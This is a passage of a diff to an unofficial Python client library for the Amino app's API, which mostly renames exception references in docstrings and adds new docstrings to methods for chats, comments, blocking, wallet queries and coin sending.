         elif isinstance(userId, list): userIds = userId
         else: raise exceptions.WrongType()
 
         data = {
             "title": title,
@@ -919,15 +1063,15 @@
         **Parameters**
             - **userId** : ID of the User or List of User IDs.
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if isinstance(userId, str): userIds = [userId]
         elif isinstance(userId, list): userIds = userId
         else: raise exceptions.WrongType
 
         data = dumps({
             "uids": userIds,
@@ -937,14 +1081,27 @@
         response = self.session.post(f"/g/s/chat/thread/{chatId}/member/invite", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
     def kick(self, userId: str, chatId: str, allowRejoin: bool = True):
+        """
+        Kick/ban user from/in chat.
+
+        Accepting:
+        - userId: str
+        - chatId: str
+        - allowRejoin: bool = True
+            - if False, it will ban user in chat
+
+        Recieving:
+        - object `dict`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if allowRejoin: allowRejoin = 1
         if not allowRejoin: allowRejoin = 0
         response = self.session.delete(f"/g/s/chat/thread/{chatId}/member/{userId}?allowRejoin={allowRejoin}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
@@ -958,15 +1115,15 @@
             - *size* : Size of the list.
             - *size* : Size of the list.
             - *pageToken* : Next Page Token.
 
         **Returns**
             - **Success** : :meth:`Message List <amino.lib.util.objects.MessageList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if pageToken is not None: url = f"/g/s/chat/thread/{chatId}/message?v=2&pagingType=t&pageToken={pageToken}&size={size}"
         else: url = f"/g/s/chat/thread/{chatId}/message?v=2&pagingType=t&size={size}"
 
         response = self.session.get(url, headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
@@ -980,15 +1137,15 @@
         **Parameters**
             - **chatId** : ID of the Chat.
             - **messageId** : ID of the Message.
 
         **Returns**
             - **Success** : :meth:`Message Object <amino.lib.util.objects.Message>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/chat/thread/{chatId}/message/{messageId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.Message(response.json()["message"]).Message
 
@@ -998,15 +1155,15 @@
 
         **Parameters**
             - **comId** : ID of the Community.
 
         **Returns**
             - **Success** : :meth:`Community Object <amino.lib.util.objects.Community>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s-x{comId}/community/info?withInfluencerList=1&withTopicList=true&influencerListOrderStrategy=fansCount", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.Community(response.json()["community"]).Community
 
@@ -1016,15 +1173,15 @@
 
         **Parameters**
             - **aminoId** : Amino ID of the Community.
 
         **Returns**
             - **Success** : :meth:`Community List <amino.lib.util.objects.CommunityList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/search/amino-id-and-link?q={aminoId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
 
             response = response.json()["resultList"]
@@ -1039,15 +1196,15 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`User List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/user-profile/{userId}/joined?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
@@ -1059,15 +1216,15 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`User List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/user-profile/{userId}/member?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
@@ -1079,15 +1236,15 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Visitors List <amino.lib.util.objects.VisitorsList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/user-profile/{userId}/visitors?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.VisitorsList(response.json()).VisitorsList
 
@@ -1098,23 +1255,39 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Users List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/block?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
     def get_blog_info(self, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None):
+        """
+        Getting blog info.
+
+        Accepting:
+        - blogId: str = None
+        - wikiId: str = None
+        - quizId: str = None
+        - fileId: str = None
+            - if all fields are None, exception will be raised
+            - if more than one field not empty, it will return only one object using priority like this:
+                - blogId -> quizId -> wikiId -> fileId
+
+        Recieving:
+        - object `GetBlogInfo`/`SharedFolderFile`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if blogId or quizId:
             if quizId is not None: blogId = quizId
             response = self.session.get(f"/g/s/blog/{blogId}", headers=self.additional_headers())
             if response.status_code != 200: 
                 return exceptions.CheckException(response)
             else:
                 return objects.GetBlogInfo(response.json()).GetBlogInfo
@@ -1132,14 +1305,30 @@
                 return exceptions.CheckException(response)
             else:
                 return objects.SharedFolderFile(response.json()["file"]).SharedFolderFile
 
         else: raise exceptions.SpecifyType()
 
     def get_blog_comments(self, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None, sorting: str = "newest", start: int = 0, size: int = 25):
+        """
+        Getting blog comments.
+
+        Accepting:
+        - blogId: str = None
+        - wikiId: str = None
+        - quizId: str = None
+        - fileId: str = None
+            - if all fields are None, exception will be raised
+            - if more than one field not empty, it will return only one object using priority like this:
+                - blogId -> quizId -> wikiId -> fileId
+
+        Recieving:
+        - object `CommentList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if sorting == "newest": sorting = "newest"
         elif sorting == "oldest": sorting = "oldest"
         elif sorting == "top": sorting = "vote"
         else: raise exceptions.WrongType(sorting)
 
         if blogId or quizId:
             if quizId is not None: blogId = quizId
@@ -1160,15 +1349,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`List of User IDs <None>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/block/full-list?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.json()["blockerUidList"]
 
@@ -1182,15 +1371,15 @@
                 - ``newest``, ``oldest``, ``top``
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Comments List <amino.lib.util.objects.CommentList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if sorting.lower() == "newest": sorting = "newest"
         elif sorting.lower() == "oldest": sorting = "oldest"
         elif sorting.lower() == "top": sorting = "vote"
         else: raise exceptions.WrongType(sorting)
 
         response = self.session.get(f"/g/s/user-profile/{userId}/g-comment?sort={sorting}&start={start}&size={size}", headers=self.additional_headers())
@@ -1210,15 +1399,15 @@
             - **blogId** : ID of the Blog.
             - **wikiId** : ID of the Wiki.
             - *asGuest* : Execute as a Guest.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if reason is None: raise exceptions.ReasonNeeded
         if flagType is None: raise exceptions.FlagTypeNeeded
 
         data = {
             "flagType": flagType,
             "message": reason,
@@ -1279,15 +1468,15 @@
             - **embedType** : Type of the AttachedObject Embed. Works only in AttachedObject Embeds.
             - **embedTitle** : Title of the Embed. Works only in AttachedObject Embeds.
             - **embedContent** : Content of the Embed. Works only in AttachedObject Embeds.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         if message is not None and file is None:
             message = message.replace("<$", "‎‏").replace("$>", "‬‭")
 
         mentions = []
         if mentionUserIds:
@@ -1380,15 +1569,15 @@
             - **chatId** : ID of the Chat.
             - **asStaff** : If execute as a Staff member (Leader or Curator).
             - **reason** : Reason of the action to show on the Moderation History.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "adminOpName": 102,
             "adminOpNote": {"content": reason},
             "timestamp": int(timestamp() * 1000)
         }
 
@@ -1408,15 +1597,15 @@
         **Parameters**
             - **messageId** : ID of the Message.
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "messageId": messageId,
             "timestamp": int(timestamp() * 1000)
         })
         
         response = self.session.post(f"/g/s/chat/thread/{chatId}/mark-as-read", headers=self.additional_headers(data=data), data=data)
@@ -1446,15 +1635,15 @@
             - **publishToGlobal** : If the Chat should show on Public Chats or not.
             - **doNotDisturb** : If the Chat should Do Not Disturb or not.
             - **pinChat** : If the Chat should Pinned or not.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {"timestamp": int(timestamp() * 1000)}
 
         if title: data["title"] = title
         if content: data["content"] = content
         if icon: data["icon"] = icon
         if keywords: data["keywords"] = keywords
@@ -1560,23 +1749,36 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/user-profile/{userId}?action=visit", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
     def send_coins(self, coins: int, blogId: str = None, chatId: str = None, objectId: str = None, transactionId: str = None):
+        """
+        Sending coins.
+
+        **Parameters**
+            - **blogId** : ID of the Blog.
+            - **chatId** : ID of the Chat.
+            - **objectId** : ID of ...some object.
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         url = None
         if transactionId is None: transactionId = str(UUID(hexlify(urandom(16)).decode('ascii')))
 
         data = {
             "coins": coins,
             "tippingContext": {"transactionId": transactionId},
             "timestamp": int(timestamp() * 1000)
@@ -1604,15 +1806,15 @@
 
         **Parameters**
             - **userId** : ID of the User or List of IDs of the Users.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if isinstance(userId, str):
             response = self.session.post(f"/g/s/user-profile/{userId}/member", headers=self.additional_headers())
 
         elif isinstance(userId, list):
             data = dumps({"targetUidList": userId, "timestamp": int(timestamp() * 1000)})
             
@@ -1631,15 +1833,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.delete(f"/g/s/user-profile/{userId}/member/{self.userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1649,15 +1851,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.post(f"/g/s/block/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1667,15 +1869,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.delete(f"/g/s/block/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1686,15 +1888,15 @@
         **Parameters**
             - **comId** : ID of the Community.
             - **invitationId** : ID of the Invitation Code.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {"timestamp": int(timestamp() * 1000)}
         if invitationId: data["invitationId"] = invitationId
 
         data = dumps(data)
         response = self.session.post(f"/x{comId}/s/community/join", data=data, headers=self.additional_headers(data=data))
         if response.status_code != 200: 
@@ -1709,15 +1911,15 @@
         **Parameters**
             - **comId** : ID of the Community.
             - **message** : Message to be sent.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({"message": message, "timestamp": int(timestamp() * 1000)})
         response = self.session.post(f"/x{comId}/s/community/membership-request", data=data, headers=self.additional_headers(data=data))
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
@@ -1728,15 +1930,15 @@
 
         **Parameters**
             - **comId** : ID of the Community.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.post(f"/x{comId}/s/community/leave", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1748,15 +1950,15 @@
             - **comId** : ID of the Community.
             - **reason** : Reason of the Flag.
             - **flagType** : Type of Flag.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if reason is None: raise exceptions.ReasonNeeded
         if flagType is None: raise exceptions.FlagTypeNeeded
 
         data = dumps({
             "objectId": comId,
             "objectType": 16,
@@ -1785,15 +1987,15 @@
             - **backgroundImage** : Url of the Background Picture of the Profile.
             - **backgroundColor** : Hexadecimal Background Color of the Profile.
             - **defaultBubbleId** : Chat bubble ID.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "address": None,
             "latitude": 0,
             "longitude": 0,
             "mediaList": None,
             "eventSource": "UserProfileView",
@@ -1821,15 +2023,15 @@
         **Parameters**
             - **isAnonymous** : If visibility should be Anonymous or not.
             - **getNotifications** : If account should get new Visitors Notifications.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = {"timestamp": int(timestamp() * 1000)}
 
         if not isAnonymous: data["privacyMode"] = 1
         if isAnonymous: data["privacyMode"] = 2
         if not getNotifications: data["notificationStatus"] = 2
@@ -1848,15 +2050,15 @@
 
         **Parameters**
             - **aminoId** : Amino ID of the Account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({"aminoId": aminoId, "timestamp": int(timestamp() * 1000)})
         response = self.session.post(f"/g/s/account/change-amino-id", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
@@ -1867,15 +2069,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : :meth:`Community List <amino.lib.util.objects.CommunityList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/user-profile/{userId}/linked-community", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.CommunityList(response.json()["linkedCommunityList"]).CommunityList
 
@@ -1885,15 +2087,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : :meth:`Community List <amino.lib.util.objects.CommunityList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/user-profile/{userId}/linked-community", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.CommunityList(response.json()["unlinkedCommunityList"]).CommunityList
 
@@ -1903,15 +2105,15 @@
 
         **Parameters**
             - **comIds** : IDS of the Communities.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({"ndcIds": comIds, "timestamp": int(timestamp() * 1000)})
         response = self.session.post(f"/g/s/user-profile/{self.userId}/linked-community/reorder", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
@@ -1922,15 +2124,15 @@
 
         **Parameters**
             - **comId** : ID of the Community.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.post(f"/g/s/user-profile/{self.userId}/linked-community/{comId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1940,15 +2142,15 @@
 
         **Parameters**
             - **comId** : ID of the Community.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.delete(f"/g/s/user-profile/{self.userId}/linked-community/{comId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1962,15 +2164,15 @@
             - **blogId** : ID of the Blog. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
             - **replyTo** : ID of the Comment to Reply to.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if message is None: raise exceptions.MessageNeeded
 
         data = {
             "content": message,
             "stickerId": None,
             "type": 0,
@@ -2012,15 +2214,15 @@
             - **userId** : ID of the User. (for Walls)
             - **blogId** : ID of the Blog. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if userId: response = self.session.delete(f"/g/s/user-profile/{userId}/g-comment/{commentId}", headers=self.additional_headers())
         elif blogId: response = self.session.delete(f"/g/s/blog/{blogId}/g-comment/{commentId}", headers=self.additional_headers())
         elif wikiId: response = self.session.delete(f"/g/s/item/{wikiId}/g-comment/{commentId}", headers=self.additional_headers())
         else: raise exceptions.SpecifyType
 
         if response.status_code != 200: 
@@ -2035,15 +2237,15 @@
         **Parameters**
             - **blogId** : ID of the Blog or List of IDs of the Blogs. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "value": 4,
             "timestamp": int(timestamp() * 1000)
         }
 
         if blogId:
@@ -2081,15 +2283,15 @@
         **Parameters**
             - **blogId** : ID of the Blog. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if blogId: response = self.session.delete(f"/g/s/blog/{blogId}/g-vote?eventSource=UserProfileView", headers=self.additional_headers())
         elif wikiId: response = self.session.delete(f"/g/s/item/{wikiId}/g-vote?eventSource=PostDetailView", headers=self.additional_headers())
         else: raise exceptions.SpecifyType
 
         if response.status_code != 200: 
             return exceptions.CheckException(response)
@@ -2105,15 +2307,15 @@
             - **userId** : ID of the User. (for Walls)
             - **blogId** : ID of the Blog. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "value": 4,
             "timestamp": int(timestamp() * 1000)
         }
 
         if userId:
@@ -2150,15 +2352,15 @@
             - **userId** : ID of the User. (for Walls)
             - **blogId** : ID of the Blog. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if userId: response = self.session.delete(f"/g/s/user-profile/{userId}/comment/{commentId}/g-vote?eventSource=UserProfileView", headers=self.additional_headers())
         elif blogId: response = self.session.delete(f"/g/s/blog/{blogId}/comment/{commentId}/g-vote?eventSource=PostDetailView", headers=self.additional_headers())
         elif wikiId: response = self.session.delete(f"/g/s/item/{wikiId}/comment/{commentId}/g-vote?eventSource=PostDetailView", headers=self.additional_headers())
         else: raise exceptions.SpecifyType
 
         if response.status_code != 200: 
@@ -2172,15 +2374,15 @@
 
         **Parameters**
             - No parameters required.
 
         **Returns**
             - **Success** : :meth:`Membership Object <amino.lib.util.objects.Membership>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/membership?force=true", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.Membership(response.json()).Membership
 
@@ -2193,15 +2395,15 @@
                 - ``en``, ``es``, ``pt``, ``ar``, ``ru``, ``fr``, ``de``
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Blogs List <amino.lib.util.objects.BlogList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if language not in self.get_supported_languages(): raise exceptions.UnsupportedLanguage(language)
         response = self.session.get(f"/g/s/announcement?language={language}&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.BlogList(response.json()["blogList"]).BlogList
@@ -2212,15 +2414,15 @@
 
         **Parameters**
             - No parameters required.
 
         **Returns**
             - **Success** : :meth:`Wallet Object <amino.lib.util.objects.WalletInfo>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/wallet", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.WalletInfo(response.json()["wallet"]).WalletInfo
 
@@ -2231,15 +2433,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Wallet Object <amino.lib.util.objects.WalletInfo>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/wallet/coin/history?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.WalletHistory(response.json()["coinHistoryList"]).WalletHistory
 
@@ -2249,15 +2451,15 @@
 
         **Parameters**
             - **deviceID** : ID of the Device.
 
         **Returns**
             - **Success** : :meth:`User ID <amino.lib.util.objects.UserProfile.userId>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/auid?deviceId={deviceId}")
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.json()["auid"]
 
@@ -2268,15 +2470,15 @@
         **Parameters**
             - **code** : Code from the Amino URL.
                 - ``http://aminoapps.com/p/EXAMPLE``, the ``code`` is 'EXAMPLE'.
 
         **Returns**
             - **Success** : :meth:`From Code Object <amino.lib.util.objects.FromCode>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/link-resolution?q={code}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.FromCode(response.json()["linkInfoV2"]).FromCode
 
@@ -2288,15 +2490,15 @@
             - **objectID** : ID of the Object. User ID, Blog ID, etc.
             - **objectType** : Type of the Object.
             - *comId* : ID of the Community. Use if the Object is in a Community.
 
         **Returns**
             - **Success** : :meth:`From Code Object <amino.lib.util.objects.FromCode>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "objectId": objectId,
             "targetCode": 1,
             "objectType": objectType,
             "timestamp": int(timestamp() * 1000)
         })
@@ -2314,15 +2516,15 @@
 
         **Parameters**
             - No parameters required.
 
         **Returns**
             - **Success** : :meth:`List of Supported Languages <List>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/community-collection/supported-languages?start=0&size=100", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.json()["supportedLanguages"]
 
@@ -2332,15 +2534,15 @@
 
         **Parameters**
             - No parameters required.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.post(f"/g/s/coupon/new-user-coupon/claim", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -2351,15 +2553,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`List <List>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/store/subscription?objectType=122&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
